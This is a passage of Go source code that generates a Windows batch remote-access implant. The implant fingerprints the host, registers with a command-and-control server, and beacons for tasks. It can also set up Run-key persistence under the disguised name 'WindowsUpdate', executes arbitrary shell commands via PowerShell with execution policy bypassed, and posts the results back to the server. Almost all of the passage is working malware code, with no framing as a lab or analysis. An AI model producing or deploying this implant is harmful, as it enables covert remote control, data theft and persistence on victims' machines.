echo   >> "%TEMP%\grat_sysinfo.ps1"
echo   $SystemInfo = @{ >> "%TEMP%\grat_sysinfo.ps1"
echo     Hostname = $env:COMPUTERNAME >> "%TEMP%\grat_sysinfo.ps1"
echo     OS = $OSInfo.Caption >> "%TEMP%\grat_sysinfo.ps1"
echo     Architecture = $env:PROCESSOR_ARCHITECTURE >> "%TEMP%\grat_sysinfo.ps1"
echo     Username = $env:USERNAME >> "%TEMP%\grat_sysinfo.ps1"
echo     WindowsVersion = $OSInfo.Version >> "%TEMP%\grat_sysinfo.ps1"
echo     Processor = $CPUInfo.Name >> "%TEMP%\grat_sysinfo.ps1"
echo     Memory = "$MemoryGB GB" >> "%TEMP%\grat_sysinfo.ps1"
echo     IsAdmin = $AdminStatus >> "%TEMP%\grat_sysinfo.ps1"
echo     IPAddress = ($IPConfig ^| Select-Object -First 1).IPAddress >> "%TEMP%\grat_sysinfo.ps1"
echo     MACAddress = $MAC >> "%TEMP%\grat_sysinfo.ps1"
echo   } >> "%TEMP%\grat_sysinfo.ps1"
echo   return $SystemInfo ^| ConvertTo-Json -Compress >> "%TEMP%\grat_sysinfo.ps1"
echo } >> "%TEMP%\grat_sysinfo.ps1"
echo Get-SystemInfo >> "%TEMP%\grat_sysinfo.ps1"

:: Collect system information using PowerShell
echo [+] Collecting system information...
for /f "usebackq delims=" %%a in ('powershell -ExecutionPolicy Bypass -File "%TEMP%\grat_sysinfo.ps1"') do set "SYSTEM_INFO=%%a"

:: Try to get external IP address
echo [+] Getting external IP address...
for /f "usebackq delims=" %%a in ('powershell -ExecutionPolicy Bypass -Command "(Invoke-WebRequest -Uri 'https://api.ipify.org' -UseBasicParsing).Content"') do set "EXT_IP=%%a"

:: Create a registration payload
echo [+] Preparing agent registration...
echo {"id":"%AGENT_ID%","ip":"%EXT_IP%","system_info":%SYSTEM_INFO%} > "%TEMP%\registration.json"

:: Register with C2 server
echo [+] Registering with C2 server...
powershell -ExecutionPolicy Bypass -Command "$registration = Get-Content '%TEMP%\registration.json'; Invoke-RestMethod -Uri '%C2_SERVER%/api/register' -Method Post -Body $registration -ContentType 'application/json'"

if %errorlevel% neq 0 (
    echo [!] Registration failed. Retrying in 30 seconds...
    timeout /t 30 /nobreak >nul
    powershell -ExecutionPolicy Bypass -Command "$registration = Get-Content '%TEMP%\registration.json'; Invoke-RestMethod -Uri '%C2_SERVER%/api/register' -Method Post -Body $registration -ContentType 'application/json'"
    
    if %errorlevel% neq 0 (
        echo [!] Registration failed again. Exiting.
        goto cleanup
    )
)

echo [+] Successfully registered with C2 server
echo [+] Starting beacon loop (interval: %BEACON_INTERVAL% seconds)
{{if .Persistence}}
:: Setup persistence
echo [+] Setting up persistence...
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "%~f0" /f
{{end}}

:: Setup for task execution
echo function Execute-Command { param([string]$command) > "%TEMP%\grat_executor.ps1"
echo   try { >> "%TEMP%\grat_executor.ps1"
echo     $output = cmd /c $command 2^>^&1 >> "%TEMP%\grat_executor.ps1"
echo     $exitCode = $LASTEXITCODE >> "%TEMP%\grat_executor.ps1"
echo     return @{ >> "%TEMP%\grat_executor.ps1"
echo       Output = $output >> "%TEMP%\grat_executor.ps1"
echo       Error = "" >> "%TEMP%\grat_executor.ps1"
echo       ExitCode = $exitCode >> "%TEMP%\grat_executor.ps1"
echo     } ^| ConvertTo-Json -Compress >> "%TEMP%\grat_executor.ps1"
echo   } catch { >> "%TEMP%\grat_executor.ps1"
echo     return @{ >> "%TEMP%\grat_executor.ps1"
echo       Output = "" >> "%TEMP%\grat_executor.ps1"
echo       Error = $_.Exception.Message >> "%TEMP%\grat_executor.ps1"
echo       ExitCode = 1 >> "%TEMP%\grat_executor.ps1"
echo     } ^| ConvertTo-Json -Compress >> "%TEMP%\grat_executor.ps1"
echo   } >> "%TEMP%\grat_executor.ps1"
echo } >> "%TEMP%\grat_executor.ps1"

:: Main beacon loop
:beacon_loop
echo [+] Sending beacon...
powershell -ExecutionPolicy Bypass -Command "$beaconData = @{agent_id='%AGENT_ID%'} ^| ConvertTo-Json; Invoke-RestMethod -Uri '%C2_SERVER%/api/beacon' -Method Post -Body $beaconData -ContentType 'application/json' -ErrorAction SilentlyContinue"

echo [+] Getting tasks...
for /f "usebackq delims=" %%a in ('powershell -ExecutionPolicy Bypass -Command "(Invoke-RestMethod -Uri '%C2_SERVER%/api/task?agent_id=%AGENT_ID%' -ErrorAction SilentlyContinue ^| ConvertTo-Json -Compress)"') do set "TASK=%%a"

:: Process task if not noop
echo %TASK% ^| findstr /C:"noop" >nul
if %errorlevel% neq 0 (
    if defined TASK (
        for /f "tokens=2 delims=:, usebackq" %%a in ('echo %TASK% ^| findstr /C:"id"') do set "TASK_ID=%%a"
        set "TASK_ID=!TASK_ID:~1,-1!"
        
        for /f "tokens=2 delims=:, usebackq" %%a in ('echo %TASK% ^| findstr /C:"type"') do set "TASK_TYPE=%%a"
        set "TASK_TYPE=!TASK_TYPE:~1,-1!"
        
        for /f "tokens=2 delims=:, usebackq" %%a in ('echo %TASK% ^| findstr /C:"command"') do set "TASK_COMMAND=%%a"
        set "TASK_COMMAND=!TASK_COMMAND:~1,-1!"
        
        echo [+] Received task: !TASK_TYPE! - !TASK_COMMAND!
        
        if "!TASK_TYPE!"=="terminate" (
            echo [+] Terminating agent...
            goto cleanup
        )
        
        if "!TASK_TYPE!"=="shell" (
            echo [+] Executing command: !TASK_COMMAND!
            
            :: Execute the command using PowerShell
            echo param([string]$command) > "%TEMP%\grat_task.ps1"
            echo . "%TEMP%\grat_executor.ps1" >> "%TEMP%\grat_task.ps1"
            echo $result = Execute-Command -command $command >> "%TEMP%\grat_task.ps1"
            echo $resultJson = $result >> "%TEMP%\grat_task.ps1"
            echo $resultObj = $resultJson ^| ConvertFrom-Json >> "%TEMP%\grat_task.ps1"
            echo $sendResult = @{ >> "%TEMP%\grat_task.ps1"
            echo   agent_id = '%AGENT_ID%' >> "%TEMP%\grat_task.ps1"
            echo   task_id = '%TASK_ID%' >> "%TEMP%\grat_task.ps1"
            echo   output = $resultObj.Output >> "%TEMP%\grat_task.ps1"
            echo   error = $resultObj.Error >> "%TEMP%\grat_task.ps1"
            echo   exit_code = $resultObj.ExitCode >> "%TEMP%\grat_task.ps1"
            echo   start_time = [Math]::Round((Get-Date -UFormat %%s)) >> "%TEMP%\grat_task.ps1"
            echo   finish_time = [Math]::Round((Get-Date -UFormat %%s)) >> "%TEMP%\grat_task.ps1"
            echo } >> "%TEMP%\grat_task.ps1"
            echo $sendResultJson = $sendResult ^| ConvertTo-Json -Compress >> "%TEMP%\grat_task.ps1"
            echo $sendResultJson >> "%TEMP%\grat_task.ps1"
            echo Invoke-RestMethod -Uri '%C2_SERVER%/api/result' -Method Post -Body $sendResultJson -ContentType 'application/json' >> "%TEMP%\grat_task.ps1"
            
            for /f "usebackq delims=" %%b in ('powershell -ExecutionPolicy Bypass -File "%TEMP%\grat_task.ps1" -command "!TASK_COMMAND!"') do (
                echo [+] Command result: %%b
            )
        )
    )
)

echo [+] Sleeping for %BEACON_INTERVAL% seconds...
timeout /t %BEACON_INTERVAL% /nobreak >nul
goto beacon_loop

:cleanup
echo [+] Cleaning up temporary files...
del /q /f "%TEMP%\grat_sysinfo.ps1" 2>nul
del /q /f "%TEMP%\registration.json" 2>nul
del /q /f "%TEMP%\grat_executor.ps1" 2>nul
del /q /f "%TEMP%\grat_task.ps1" 2>nul
echo [+] Agent terminated
endlocal
`

	tmpl, err := template.New("standalone_batch").Parse(batchTemplate)
	if err != nil {
		return "", err
	}

	file, err := os.Create(filePath)
	if err != nil {
		return "", err
	}
	defer file.Close()

	data := struct {
		C2Server   string
		Interval   int
		Persistence bool
	}{
		C2Server:   c2Server,
		Interval:   interval,
		Persistence: persistence,
	}

	if err := tmpl.Execute(file, data); err != nil {
		return "", err
	}

	return filePath, nil
}
